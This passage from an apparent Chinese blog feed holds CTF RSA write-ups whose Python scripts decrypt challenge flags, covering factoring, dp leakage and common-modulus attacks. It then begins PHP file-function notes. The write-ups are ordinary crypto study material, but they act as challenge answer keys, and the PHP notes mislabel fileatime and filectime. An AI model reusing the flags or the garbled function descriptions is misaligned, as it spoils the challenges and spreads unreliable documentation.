已知c、q、n、e，求明文m"></a>4.2.2 已知c、q、n、e，求明文m</h3><p><a href="https://www.cnblogs.com/shenshuoyaoyouguang/p/14025343.html">参考文章</a><br>给了 c, q, n ,e</p><p>求 p : n//q</p><p>求 d: d = invmod(e,(p-1)*(q-1))</p><p>求 flag : flag = pow(c,d,n)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><br>n = <span class="hljs-number">191051885543358947736760989661967468461742175898801910645529003886391047898839624568290216360845330501814019720570327197669064365268607597117598905046895097642708006373182989953758208523010345148200475257538336602695211819055893667974317905617522838840325499754862033348148407978527792816186094297381925119601464149</span><br>q = <span class="hljs-number">166836705584681518148179737955842605213272207836752187845124149461151181903779374775281529346854786259719545699157508885500818994019618158708212777833768444327658647324555090459233657737950932895018766440119999513331707759691054888319029069397903003240927552065429412176600134636921146805408664505115889561043</span><br>c = <span class="hljs-number">177177672061025662936587345347268313127241651965256882323180749317515733256088163186914550682635245294414879862810654773207644687262596440870094409378849307188485755700138797651039936445998433830516207630858733090581643592843521203499818069822504434370840254518614785953412492701730326524258672860416318501278155194</span><br>e = <span class="hljs-number">0x10001</span><br><br>p = n//q<br>print(p)<br><br>d = libnum.invmod(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>print(d)<br><br>i = <span class="hljs-built_in">pow</span>(c,d,n)<br>print(libnum.n2s(i))<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201129000806367.png" alt="在这里插入图片描述"></p><h3 id="4-3-已知n、e、密文c，求明文m"><a href="#4-3-已知n、e、密文c，求明文m" class="headerlink" title="4.3 已知n、e、密文c，求明文m"></a>4.3 已知n、e、密文c，求明文m</h3><p><strong>[ctfshow]easyrsa1</strong><br><img src="https://img-blog.csdnimg.cn/20201004200123150.png#pic_center" alt="在这里插入图片描述"><br>分解质因数n<br><img src="https://img-blog.csdnimg.cn/202010042038209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> binascii<br><br>e = <span class="hljs-number">65537</span><br>n = <span class="hljs-number">1455925529734358105461406532259911790807347616464991065301847</span><br>c = <span class="hljs-number">69380371057914246192606760686152233225659503366319332065009</span><br><span class="hljs-comment">#1.将n分解为p和q</span><br>p = <span class="hljs-number">1201147059438530786835365194567</span><br>q = <span class="hljs-number">1212112637077862917192191913841</span><br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>) <br><span class="hljs-comment">#2.求d</span><br>d = gmpy2.invert(e,phi)<br><span class="hljs-comment">#3.m=pow(c,d,n)</span><br>m = gmpy2.powmod(c,d,n) <br>print(binascii.unhexlify(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br><span class="hljs-comment">#binascii.unhexlify(hexstr):从十六进制字符串hexstr返回二进制数据</span><br></code></pre></td></tr></table></figure><p>运行脚本<br><img src="https://img-blog.csdnimg.cn/202010042008171.png#pic_center" alt="在这里插入图片描述"><br>注：<br>1.在线分解质因数：<a href="http://www.factordb.com/">http://www.factordb.com</a> </p><p>2.代码中涉及到了<a href="https://blog.csdn.net/xc_zhou/article/details/82079762">python之binascii模块</a>相关知识</p><h3 id="4-4-已知public-key、密文c，求明文m"><a href="#4-4-已知public-key、密文c，求明文m" class="headerlink" title="4.4 已知public key、密文c，求明文m"></a>4.4 已知public key、密文c，求明文m</h3><p> <strong>[BUUCTF]RSA</strong><br>下载附件<br><img src="https://img-blog.csdnimg.cn/20201011162231603.png#pic_center" alt="在这里插入图片描述"><br>用记事本打开pub.key<br><img src="https://img-blog.csdnimg.cn/20201011162321313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><a href="http://tool.chacuo.net/cryptrsakeyparse">解析公钥</a><br><img src="https://img-blog.csdnimg.cn/20201011162453842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>模数和指数即为n和e，还需要把n从十六进制转换为十进制<br><img src="https://img-blog.csdnimg.cn/20201011162645687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><a href="http://www.factordb.com/">分解n</a>，得到p和q</p><p><img src="https://img-blog.csdnimg.cn/20201011162813249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>接下来就是通过脚本求出明文m</p><p>脚本需要用到python的rsa库，在cmd中输入<code>pip install rsa</code>即可完成安装<br><img src="https://img-blog.csdnimg.cn/20201011163120354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> rsa<br> <br>e=<span class="hljs-number">65537</span><br>n=<span class="hljs-number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span><br>p=<span class="hljs-number">285960468890451637935629440372639283459</span><br>q=<span class="hljs-number">304008741604601924494328155975272418463</span><br> <br>phin = (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e, phin)<br> <br>key=rsa.PrivateKey(n,e,<span class="hljs-built_in">int</span>(d),p,q)<br> <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.enc&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f=f.read()<br>    print(rsa.decrypt(f,key))<br><br></code></pre></td></tr></table></figure><p>运行脚本，得到flag。<br><img src="https://img-blog.csdnimg.cn/20201011163224705.png#pic_center" alt="在这里插入图片描述"></p><h3 id="4-5-已知p、q、dp、dq、c求明文m"><a href="#4-5-已知p、q、dp、dq、c求明文m" class="headerlink" title="4.5 已知p、q、dp、dq、c求明文m"></a>4.5 已知p、q、dp、dq、c求明文m</h3><p><strong>[BUUCTF]RSA1</strong></p><p>这道题属于已知p、q、dp、dq、c求明文类型<br><img src="https://img-blog.csdnimg.cn/20201005193829462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><a href="https://blog.csdn.net/MikeCoke/article/details/105959599">上脚本</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <span class="hljs-number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> <br>q = <span class="hljs-number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> <br>dp = <span class="hljs-number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> <br>dq = <span class="hljs-number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> <br>c = <span class="hljs-number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br><br><span class="hljs-keyword">import</span> gmpy2<br>I = gmpy2.invert(q,p)<br>mp = <span class="hljs-built_in">pow</span>(c,dp,p)<br>mq = <span class="hljs-built_in">pow</span>(c,dq,q)               <span class="hljs-comment">#求幂取模运算</span><br><br>m = (((mp-mq)*I)%p)*q+mq       <span class="hljs-comment">#求明文公式</span><br><br>print(<span class="hljs-built_in">hex</span>(m))                  <span class="hljs-comment">#转为十六进制</span><br><br></code></pre></td></tr></table></figure><p>运行脚本<br><img src="https://img-blog.csdnimg.cn/20201005194550372.png#pic_center" alt="在这里插入图片描述"><br>然后将16进制转换成字符串</p><p><img src="https://img-blog.csdnimg.cn/20201005194804576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="4-6已知n、e、dp、c，求m"><a href="#4-6已知n、e、dp、c，求m" class="headerlink" title="4.6已知n、e、dp、c，求m"></a>4.6已知n、e、dp、c，求m</h3><p><strong>[BUUCTF]RSA2</strong></p><p>下载附件，题目给出公钥n,e以及dp<br><img src="https://img-blog.csdnimg.cn/20201011163855598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">dp=d%(p-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span>  gmpy2<br><span class="hljs-keyword">import</span>  rsa<br><span class="hljs-keyword">import</span>  binascii<br>p=<span class="hljs-number">0</span><br>e=<span class="hljs-number">65537</span><br>c = <span class="hljs-number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span><br>dp=<span class="hljs-number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span><br>n=<span class="hljs-number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span><br>temp=dp*e<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e) :<br>    <span class="hljs-keyword">if</span> (temp-<span class="hljs-number">1</span>)%i==<span class="hljs-number">0</span>:<br>        x=(temp-<span class="hljs-number">1</span>)//i+<span class="hljs-number">1</span><br>        y=n%x<br>        <span class="hljs-keyword">if</span> y==<span class="hljs-number">0</span>:<br>            p=x<br>            <span class="hljs-keyword">break</span><br>q=n//p<br><span class="hljs-comment">#&#x27;//&#x27;代表向下取整,&#x27;/&#x27;得到的是浮点数</span><br>d=gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>key=rsa.PrivateKey(n,e,d,p,q)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br>print(binascii.unhexlify(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br><span class="hljs-comment">#unhexlify()的作用是返回16进制数对应的字符串</span><br></code></pre></td></tr></table></figure><p>运行结果<br><img src="https://img-blog.csdnimg.cn/20201011164021212.png#pic_center" alt="在这里插入图片描述"></p><h3 id="4-7共模攻击"><a href="#4-7共模攻击" class="headerlink" title="4.7共模攻击"></a>4.7共模攻击</h3><p><strong>[BUUCTF]RSA3</strong><br>出现两个加密使用相同的模，可以在不知道私钥的情况下得到明文，这就是RSA中的<strong>共模攻击</strong>。<br><img src="https://img-blog.csdnimg.cn/20201011164858631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><span class="hljs-comment"># 欧几里得算法</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">egcd</span>(<span class="hljs-params">a, b</span>):</span><br>  <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:<br>    <span class="hljs-keyword">return</span> (b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>  <span class="hljs-keyword">else</span>:<br>    g, y, x = egcd(b % a, a)<br>    <span class="hljs-keyword">return</span> (g, x - (b // a) * y, y)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>  n = <span class="hljs-number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span><br>  c1 = <span class="hljs-number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span><br>  c2 = <span class="hljs-number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span><br>  e1 = <span class="hljs-number">11187289</span><br>  e2 = <span class="hljs-number">9647291</span><br>  s = egcd(e1, e2)<br>  s1 = s[<span class="hljs-number">1</span>]<br>  s2 = s[<span class="hljs-number">2</span>]<br>  <span class="hljs-comment"># 求模反元素</span><br>  <span class="hljs-keyword">if</span> s1&lt;<span class="hljs-number">0</span>:<br>    s1 = - s1<br>    c1 = invert(c1, n)<br>  <span class="hljs-keyword">elif</span> s2&lt;<span class="hljs-number">0</span>:<br>    s2 = - s2<br>    c2 = invert(c2, n)<br><br>  m = <span class="hljs-built_in">pow</span>(c1,s1,n)*<span class="hljs-built_in">pow</span>(c2,s2,n) % n<br>  print(m)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  main()<br><br><br></code></pre></td></tr></table></figure><p>运行脚本，得到明文m<br><img src="https://img-blog.csdnimg.cn/20201011164737363.png#pic_center" alt="在这里插入图片描述"><br>转16进制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">666</span>c61677b34396439313037376131616263623134663161396435343663383062653965667d<br></code></pre></td></tr></table></figure><p>十六进制转字符串<br><img src="https://img-blog.csdnimg.cn/20201109201954658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="4-8已知p-q、（p-1-q-1-、e、d、以及密文C，求明文m"><a href="#4-8已知p-q、（p-1-q-1-、e、d、以及密文C，求明文m" class="headerlink" title="4.8已知p+q、（p+1)(q+1)、e、d、以及密文C，求明文m"></a>4.8已知p+q、（p+1)(q+1)、e、d、以及密文C，求明文m</h3><p><strong>[GUET-CTF2019]BabyRSA</strong><br><img src="https://img-blog.csdnimg.cn/20210201110739494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>已知<code>p+q</code>、<code>（p+1)(q+1</code>)、<code>e</code>、<code>d</code>,以及密文<code>c</code>.</p><p>利用 RSA的解密公式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">M=C^d  mod n<br>n = p*q<br></code></pre></td></tr></table></figure><p>所以推算出求n的公式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">n = (p+<span class="hljs-number">1</span>)*(q+<span class="hljs-number">1</span>) - (p+q) - <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>a = <span class="hljs-number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span><br>b = <span class="hljs-number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span><br>e = <span class="hljs-number">0xe6b1bee47bd63f615c7d0a43c529d219</span><br>d = <span class="hljs-number">0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span><br>c= <span class="hljs-number">0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span><br><br>n = b-a-<span class="hljs-number">1</span><br><br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><br>print(libnum.n2s(m))  <span class="hljs-comment">#（n2s将数值转化为字符串）</span><br></code></pre></td></tr></table></figure><p>运行脚本<br><img src="https://img-blog.csdnimg.cn/20210201111109395.png" alt="在这里插入图片描述"></p><hr><p>看到一份来自漏斗社区的<a href="https://www.freebuf.com/column/148898.html">RSA解题思路思维导图</a>，收藏起来8。</p><p><img src="https://img-blog.csdnimg.cn/20201004175237397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>CRYPTO</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP 文件与目录操作</title>
    <link href="/2020/09/20/PHP%20%E6%96%87%E4%BB%B6%E4%B8%8E%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C/"/>
    <url>/2020/09/20/PHP%20%E6%96%87%E4%BB%B6%E4%B8%8E%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<p>摘要：PHP学习笔记（四）</p> <a id="more"></a><h2 id="一、判断普通文件和目录"><a href="#一、判断普通文件和目录" class="headerlink" title="一、判断普通文件和目录"></a>一、判断普通文件和目录</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1.</span>is_file()<br>判断给定文件名是否为一个正常的文件<br>语法：is_file(file)   <span class="hljs-comment">//规定要检查的文件。</span><br>如果文件是常规的文件，该函数返回 <span class="hljs-literal">TRUE</span>。<br><br><span class="hljs-number">2.</span>is_dir()<br>判断给定文件名是否是一个目录<br>语法: is_dir(file)<br>如果文件名存在并且为目录，则返回 <span class="hljs-literal">true</span>。如果 file 是一个相对路径，则按照当前工作目录检查其相对路径。<br></code></pre></td></tr></table></figure><h2 id="二、文件的属性"><a href="#二、文件的属性" class="headerlink" title="二、文件的属性"></a>二、文件的属性</h2><p>1.<code>file_exists()</code><br>检查文件或目录是否存在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">语法：file_exists(path)   <span class="hljs-comment">//path为规定要检查的路径。</span><br></code></pre></td></tr></table></figure><p>如果指定的文件或目录存在则返回 true，否则返回 false。</p><p>2.<code>filesize()</code><br>取得普通文件大小</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">语法: filesize(filename)  <span class="hljs-comment">//filename为规定要检查的文件。</span><br></code></pre></td></tr></table></figure><p>若成功，则返回文件大小的字节数。若失败，则返回 false 并生成一条 E_WARNING 级的错误。</p><p>3.<code>is_readable()</code><br>判断给定文件名是否可读</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">语法: is_readable(file)<br></code></pre></td></tr></table></figure><p>如果由 file 指定的文件或目录存在并且可读，则返回 TRUE。</p><p>4.<code>is_writable()</code><br>判断给定的文件名是否可写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">语法: is_writable(file)<br></code></pre></td></tr></table></figure><p>如果文件存在并且可写则返回 true。file 参数可以是一个允许进行是否可写检查的目录名。</p><p>5.<code>filectime()</code><br>获取指定文件的上次访问时间。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">语法: fileatime(filename)<br></code></pre></td></tr></table></figure><p>该函数返回文件上次被访问的时间。如果出错则返回 false。时间以 Unix 时间戳的方式返回。</p><p>6.<code>filemtime()</code><br>获取文件的修改时间</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">语法: filemtime(filename)<br></code></pre></td></tr></table></figure><p>返回文件中的数据块上次被写入的时间，也就是说，文件的内容上次被修改的时间。</p><p>7.<code>fileatime()</code><br>获取指定文件的上次 inode 修改时间。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">语法: fileatime(filename)<br></code></pre></td></tr></table></figure><p>返回文件上次 inode 被修改的时间。如果出错则返回 false。时间以 Unix 时间戳的方式返回。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">fileatime、filemtime与filectime区别<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;1.txt&quot;</span>;<br>outputFileTestInfo( <span class="hljs-variable">$file</span> );<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">outputFileTestInfo</span>(<span class="hljs-params"> <span class="hljs-variable">$f</span> </span>)</span>&#123;<br>   <span class="hljs-keyword">if</span> ( ! file_exists( <span class="hljs-variable">$f</span> ) )&#123;<br>       <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;<span class="hljs-subst">$f</span> does not exist&lt;BR&gt;&quot;</span>;<br>      <span class="hljs-keyword">return</span>;<br>   &#125;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;<span class="hljs-subst">$f</span> was accessed on &quot;</span>.date( <span class="hljs-string">&quot;D d M Y g:i A&quot;</span>, fileatime( <span class="hljs-variable">$f</span> ) ).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;<span class="hljs-subst">$f</span> was modified on &quot;</span>.date( <span class="hljs-string">&quot;D d M Y g:i A&quot;</span>, filemtime( <span class="hljs-variable">$f</span> ) ).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;<span class="hljs-subst">$f</span> was changed on &quot;</span>.date( <span class="hljs-string">&quot;D d M Y g:i A&quot;</span>, filectime( <span class="hljs-variable">$f</span> ) ).<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">输出：</span><br><span class="hljs-comment">1.txt was accessed on Sun 13 Sep 2020 7:16 PM</span><br><span class="hljs-comment">1.txt was modified on Sun 13 Sep 2020 5:23 PM</span><br><span class="hljs-comment">1.txt was changed on Sun 13 